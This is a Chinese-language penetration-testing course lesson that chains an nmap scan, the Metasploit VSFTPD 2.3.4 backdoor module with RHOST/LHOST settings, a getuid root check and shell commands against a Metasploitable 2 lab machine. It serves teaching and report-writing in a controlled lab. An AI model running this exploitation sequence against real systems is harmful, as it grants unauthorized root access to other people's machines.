
伦理黑客与渗透测试：67：⛓️最终攻击链

在本节课中，我们将学习如何把前面几节课学到的所有知识点，串联成一条完整的攻击链。从扫描目标，到发现漏洞，再到发起攻击和确认权限，整个过程会像真实的渗透测试任务一样连贯进行。这不是在教新东西，而是在把旧东西复习一遍，让你看清楚每一步是怎么衔接在一起的。

在开始之前，我们需要做一个快速的出发前检查清单，因为本节课会一次性调用之前好几个模块里的工具。

首先，请确认Kali Linux和Metasploitable 2这两台虚拟机都已经启动，并且能够互相通信。你可以用简单的ping命令来验证它们之间的连通性，确认两台机器确实在线。

接下来，你需要知道两台机器的当前IP地址。扫描和利用都需要Metasploitable的IP地址，稍后设置攻击参数时，还需要Kali自己的IP地址作为LHOST。这和我们在第7节课中做的完全一样，VSFTPD漏洞利用必须同时设置RHOST和LHOST，不能漏掉任何一步。

这个漏洞利用在当前版本的Metasploit中默认使用的是meterpreter负载，而不是普通的反弹 shell。所以当我们到那一步时，千万不要跳过设置LHOST的操作。在我这里，两台虚拟机都已经运行了，环境准备就绪。

以下是我们需要准备的关键信息：

- 目标机器IP地址：192.168.56.101
- 攻击机器IP地址：192.168.56.102
- 使用的漏洞模块：VSFTPD后门

第1步：扫描目标

我们先来扫描目标机器，看看开放了哪些端口，运行着什么服务。

输入nmap命令，使用-A参数进行版本和操作系统探测，并用-oN参数把扫描结果保存到文本文件里。目标IP地址是192.168.56.101。

```bash
nmap -A -oN course.txt 192.168.56.101
```

![](img/797e503f140b5e731e39ea2cb3f5ec57_1.png)

这里有一个习惯你要记住，我们在第5节课里就养成了，就是扫描的同时立即把输出结果保存下来。这个文件本身就是证据链的一部分，哪怕扫描还没结束，它已经算作我们的取证材料了。

![](img/797e503f140b5e731e39ea2cb3f5ec57_3.png)

扫描运行时，我们可以先验证一下目标是否可达。使用ping命令发送几个数据包到192.168.56.101，如果能收到回应，说明网络是通的。

![](img/797e503f140b5e731e39ea2cb3f5ec57_5.png)

![](img/797e503f140b5e731e39ea2cb3f5ec57_7.png)

同时，我们也要确认自己Kali机器的IP地址。在我的环境里，Kali的IP是192.168.56.102，你的环境可能不一样，请以实际为准。

![](img/797e503f140b5e731e39ea2cb3f5ec57_9.png)

扫描完成后，你可以查看结果。你会发现很多端口是开放的，各种服务都在运行。这些输出内容和我们之前几节课看到的非常相似，这也证明了环境没有变。

![](img/797e503f140b5e731e39ea2cb3f5ec57_11.png)

![](img/797e503f140b5e731e39ea2cb3f5ec57_13.png)

第2步：锁定目标漏洞

扫描结果出来之后，通常会有很多发现。但今天我们不打算逐个研究每一个端口或服务，而是故意重复使用之前在课程中多次遇到的那个VSFTPD后门漏洞。

这样做是为了让你清楚地看到完整的攻击链概念，从最初的发现一直到最后的文档记录，而不是在课程快结束的时候，再给你介绍一个你从来没见过的陌生漏洞。

以下是我们选择的目标漏洞：

- 漏洞名称：VSFTPD 2.3.4 后门
- 漏洞类型：远程代码执行
- 利用模块：exploit/unix/ftp/vsftpd_234_backdoor

![](img/797e503f140b5e731e39ea2cb3f5ec57_15.png)

第3步：发起攻击

![](img/797e503f140b5e731e39ea2cb3f5ec57_17.png)

现在我们要启动Metasploit控制台，开始实际的利用过程。

![](img/797e503f140b5e731e39ea2cb3f5ec57_19.png)

启动msfconsole后，等待它加载完成。加载好之后，我们选择之前确定的那个VSFTPD后门模块。

![](img/797e503f140b5e731e39ea2cb3f5ec57_21.png)

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

![](img/797e503f140b5e731e39ea2cb3f5ec57_23.png)

模块加载进来之后，接下来要设置攻击目标。我们需要把RHOST设置为目标系统的IP地址，也就是192.168.56.101。

```bash
set RHOST 192.168.56.101
```

还记得在第7节课中学到的内容吗？在当前版本的Metasploit中，我们还需要设置LHOST，也就是我们自己Kali系统的IP地址。我的Kali IP是192.168.56.102，请把它填进去。

![](img/797e503f140b5e731e39ea2cb3f5ec57_25.png)

![](img/797e503f140b5e731e39ea2cb3f5ec57_27.png)

```bash
set LHOST 192.168.56.102
```

![](img/797e503f140b5e731e39ea2cb3f5ec57_29.png)

参数都设置好了，现在就可以发起攻击了。运行exploit命令，如果一切顺利，你会得到一个会话，这和我们在第7节课里看到的情况完全一样。

![](img/797e503f140b5e731e39ea2cb3f5ec57_31.png)

拿到会话之后，我们需要确认自己到底得到了什么权限。如果已经进入meterpreter会话，输入getuid命令查看当前用户身份。

```bash
getuid
```

如果输出显示是root，那就说明我们拿到了root级别的权限，和之前的结果一致。

第4步：事后利用与确认

![](img/797e503f140b5e731e39ea2cb3f5ec57_33.png)

攻击成功之后，我们还需要做一点点事后利用的工作，目的只是为了在接下来写报告时，有具体内容可以引用。

![](img/797e503f140b5e731e39ea2cb3f5ec57_35.png)

![](img/797e503f140b5e731e39ea2cb3f5ec57_37.png)

我会进入一个shell，查看目标系统的主机名和当前日期。这不是为了破坏什么，而是为了演示在渗透测试报告中，你应该记录哪些系统信息来证明入侵确实成功了。

```bash
shell
hostname
date
```

执行完这些命令之后，我们就完成了一整套浓缩的攻击链：扫描、识别漏洞、利用漏洞、确认权限。所有步骤都在一个连续的流程里高效地执行完了，这完全依靠的是你在这整门课里建立起来的技能。

下节课，我们会把刚才做的所有事情，加上保存的扫描结果文件，一起用来构建真实客户会收到的渗透测试报告结构。

![](img/797e503f140b5e731e39ea2cb3f5ec57_39.png)

本节课中我们一起学习了如何从头到尾运行一条完整的攻击链。我们确认了虚拟机环境可用，获取了目标和攻击机器的IP地址，用nmap扫描并保存了结果，复用了VSFTPD后门漏洞，在Metasploit中设置RHOST和LHOST发起攻击，用getuid确认了root权限，最后又通过shell抓取了主机名和日期作为证据。这些步骤把之前各个章节的知识点串了起来，为下一节课写报告打好了基础。
